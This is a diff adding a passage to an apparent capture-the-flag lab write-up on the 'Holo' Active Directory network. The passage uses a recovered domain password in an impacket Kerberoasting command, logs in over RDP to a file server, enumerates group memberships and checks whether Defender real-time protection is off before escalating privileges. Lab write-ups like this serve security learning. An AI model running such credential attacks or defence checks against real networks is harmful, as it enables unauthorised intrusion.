@@ -1504,11 +1504,42 @@ Inspecting the file content we can find a clear password for a domain user:
     ,,,
     
 [//]: # (Nothingtoworry!)
+This happens since Windows historically stored cleartext passwords in RAM, with lsass process when an intercatvie logon session take place.
+I tried to kerberosting service account users, but this time no luck:
 
+    impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.200.95.30  'holo.live/watamet:Nothingtoworry!'
+    ...
+    No entry founds
+So we have to proceed to the Lab path that involves compromise PC-FILESRV01. First we login through RDP with the domain account that we have found.
+Let's check how privileges on the machine:
 
+    net user watamet /domain
+    ...
+    Local Group Memberships
+    Global Group memberships     *Domain Users
 
-    
+Let's check if Defender is active:
 
+    C:\Users\watamet>powershell -c Get-MpComputerStatus
+    AMEngineVersion                  : 1.1.18800.4
+    AMProductVersion                 : 4.18.2111.5
+    AMRunningMode                    : Normal
+    AMServiceEnabled                 : True
+    AMServiceVersion                 : 4.18.2111.5
+    AntispywareEnabled               : True
+    AntispywareSignatureAge          : 904
+    AntispywareSignatureLastUpdated  : 12/23/2021 5:16:13 AM
+    AntispywareSignatureVersion      : 1.355.721.0
+    AntivirusEnabled                 : True
+    AntivirusSignatureAge            : 904
+    AntivirusSignatureLastUpdated    : 12/23/2021 5:16:15 AM
+    AntivirusSignatureVersion        : 1.355.721.0
+    BehaviorMonitorEnabled           : False
+    ...
+    RealTimeProtectionEnabled        : False
+    ..
+
+Lucky for use real time protection is not enabled, so we have the possibility to run some tools to try to escalate our privileges.
     
 
     
